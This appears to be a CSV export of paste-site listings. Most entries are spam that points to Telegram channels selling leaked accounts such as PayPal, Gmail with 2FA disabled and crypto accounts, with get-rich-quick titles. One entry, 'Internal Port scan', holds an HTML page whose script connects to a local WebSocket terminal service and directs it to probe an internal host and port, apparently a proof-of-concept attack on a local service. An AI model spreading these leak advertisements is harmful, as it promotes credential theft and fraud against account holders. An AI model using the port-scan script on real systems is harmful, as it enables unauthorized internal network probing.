id,title,username,language,date,content
GeTHetZa,FREE BTC GUIDE,FamilyHunter,JavaScript,Sunday 13th of July 2025 07:08:58 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/lukemsleaks

Accounts: 81770"
UdSCQ0mM,FREE BTC GUIDE 9,bu8,JavaScript,Sunday 13th of July 2025 07:08:55 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/KSElekas

 1757453

"
xxQCW0nJ,Make $2000 in 15 minutes Y,Polyvios,JavaScript,Sunday 13th of July 2025 07:08:48 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/KSElekas

 5665335

"
yw0KkTea,Make $1200 in 15 minutes,FamilyHunter,JavaScript,Sunday 13th of July 2025 07:08:45 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/lukemsleaks

Accounts: 72558"
X1Rfb8Xa,Netflix Premium UHD Hits,1robloxscript,JavaScript,Sunday 13th of July 2025 07:08:29 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/lukemsleaks

Accounts: 32483"
U9wTUpJL,Make $2200 in 15 minutes B,bu8,JavaScript,Sunday 13th of July 2025 07:08:25 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/KSElekas

 1042891

"
SmZt6Qzh,MAKE $1000 INSTANTLY V,Polyvios,JavaScript,Sunday 13th of July 2025 07:08:20 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/KSElekas

 8700891

"
eCMy3Azs,✅ PayPal Hits,1robloxscript,JavaScript,Sunday 13th of July 2025 07:08:18 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/lukemsleaks

Accounts: 29998"
qHz8TfbB,✅ Crypto Accounts,1robloxscript,JavaScript,Sunday 13th of July 2025 07:08:05 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/lukemsleaks

Accounts: 22996"
RJMGWLEa,MAKE $5000 INSTANTLY K,bu8,JavaScript,Sunday 13th of July 2025 07:07:55 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/KSElekas

 8572907

"
Ld5yMmBL,✅ MAKE $1200 IN 15 MIN,1robloxscript,JavaScript,Sunday 13th of July 2025 07:07:54 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/lukemsleaks

Accounts: 97033"
DhTaPzJP,✅ MAKE $22OO IN 10 MIN A,Polyvios,JavaScript,Sunday 13th of July 2025 07:07:49 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/KSElekas

 4407889

"
Xb9PrGEd,✅ Account Leaks,1robloxscript,JavaScript,Sunday 13th of July 2025 07:07:42 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/lukemsleaks

Accounts: 47391"
ynTpuPtz,Internal Port scan,osamaavvan,HTML,Sunday 13th of July 2025 07:07:42 AM CDT,"<html>

<body>Test</body>

<script>

const ws = new WebSocket('ws://localhost:7890/Terminal');

ws.onopen = function () {
  console.log('WebSocket connection established');

  const message = {
    TokenAppId: ""attacker"",
    ProcessName: ""Find"",
    IPTerminal: ""127.0.0.1"",
    PortTerminal: 80
  };

  ws.send(JSON.stringify(message));
  console.log('Message sent:', message);
};

ws.onmessage = function (event) {
  console.log('Message from server:', event.data);
};

ws.onerror = function (error) {
  console.error('WebSocket error:', error);
};

ws.onclose = function () {
  console.log('WebSocket connection closed');
};


</script>

</html>"
4JnX4Ptj,GMAIL Logs (2FA disabled),1robloxscript,JavaScript,Sunday 13th of July 2025 07:07:28 AM CDT,"We just posted new leaks.

Join the channel: https://t.me/lukemsleaks

Accounts: 50112"
